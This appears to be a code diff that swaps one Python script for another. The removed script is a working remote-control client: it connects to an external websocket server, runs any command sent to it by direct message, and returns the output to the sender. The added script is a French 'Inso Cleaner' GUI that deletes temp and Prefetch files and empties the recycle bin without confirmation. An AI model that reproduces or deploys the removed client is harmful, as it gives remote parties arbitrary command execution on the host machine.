@@ -1,68 +1,78 @@
-import asyncio
-import websockets
-import random
-import subprocess
-import re
+import os 
+import shutil
+import tempfile
+import tkinter as tk 
+from tkinter import messagebox, ttk
 
-SERVER_URL = "wss://websocket-server-no6j.onrender.com"
-RECEIVER_NAME = f"receiver_{random.randint(1000, 9999)}"
+APP_NAME = "Inso Cleaner"
 
-async def listen():
-    async with websockets.connect(SERVER_URL) as ws:
-        print(f"[System] Connected as {RECEIVER_NAME}")
-        await ws.send(f"/user {RECEIVER_NAME}")
+def nettoyer_systeme():
+    fichiers_supprimes = 0
 
-        while True:
+    temp_dir = tempfile.gettempdir()
+    fichiers_supprimes += supprimer_contenu_dossier(temp_dir)
+
+    win_temp = r"C:\Windows\Temp"
+    fichiers_supprimes += supprimer_contenu_dossier(win_temp)
+
+    win_prefetch = r"C:\Windows\Prefetch"
+    fichiers_supprimes += supprimer_contenu_dossier(win_prefetch)
+
+    try:
+        vider_corbeille()
+    except:
+        pass
+
+    messagebox.showinfo(APP_NAME, f"Nettoyage terminé.\nFichiers supprimés : {fichiers_supprimes}")
+
+def supprimer_contenu_dossier(dossier):
+    count = 0
+    if not os.path.exists(dossier):
+        return 0
+    for root, dirs, files in os.walk(dossier):
+        for file in files:
             try:
-                msg = await ws.recv()
-                print(msg)
+                os.remove(os.path.join(root, file))
+                count += 1
+            except:
+                pass
+        for dir in dirs:
+            try:
+                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)
+                count += 1
+            except:
+                pass
+    return count
 
-                if msg.startswith("[DM from "):
-                    # Extract sender username using regex
-                    match = re.search(r"\[DM from ([^\]]+)\]", msg)
-                    if not match:
-                        print("[Error] Failed to parse sender username")
-                        continue
-                    sender = match.group(1)
+def vider_corbeille():
+    import ctypes
+    SHEmptyRecycleBin = ctypes.windll.shell32.SHEmptyRecycleBinW
+    SHEmptyRecycleBin(None, None, 0x00000001)
 
-                    # Extract command after the first ']:'
-                    command = msg.split("]:", 1)[1].strip()
-                    print(f"[Command from {sender}] {command}")
+def lancer_interface():
+    root = tk.Tk()
+    root.title(APP_NAME)
+    root.geometry("500x300")
+    root.configure(bg="black")
 
-                    # Run the command safely
-                    try:
-                        output = subprocess.check_output(
-                            command,
-                            shell=False,
-                            stderr=subprocess.STDOUT,
-                            text=True,
-                            timeout=10
-                        )
-                    except subprocess.CalledProcessError as e:
-                        output = f"[Command Failed]\n{e.output.strip()}"
-                    except Exception as ex:
-                        output = f"[Error] {str(ex)}"
+    style = ttk.Style()
+    style.theme_use('clam')
+    style.configure("TButton",
+                    foreground="#00FF00",
+                    background="black",
+                    font=("Courier", 12, "bold"),
+                    borderwidth=0)
 
-                    # Limit output length
-                    output = output.strip()
-                    if not output:
-                        output = "[No output]"
-                    elif len(output) > 1500:
-                        output = output[:1500] + "\n...[truncated]"
+    titre = tk.Label(root, text="INSO CLEANER", font=("Courier", 24, "bold"), fg="#00FF00", bg="black")
+    titre.pack(pady=20)
 
-                    # Send output back to sender
-                    reply = f"/to {sender} [Output from {RECEIVER_NAME}]\n{output}"
-                    await ws.send(reply)
+    bouton = ttk.Button(root, text="Lancer le Nettoyage", command=nettoyer_systeme)
+    bouton.pack(pady=20)
 
-            except websockets.exceptions.ConnectionClosed:
-                print("[System] Disconnected from server.")
-                break
-            except Exception as e:
-                print(f"[Error] {e}")
-                continue
+    label_info = tk.Label(root, text="Optimisez votre PC avec Inso!", fg="#00FF00", bg="black", font=("Courier", 10))
+    label_info.pack(side="bottom", pady=20)
+
+    root.mainloop()
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(listen())
-    except KeyboardInterrupt:
-        print("\n[System] Closed by user.")
+    lancer_interface()
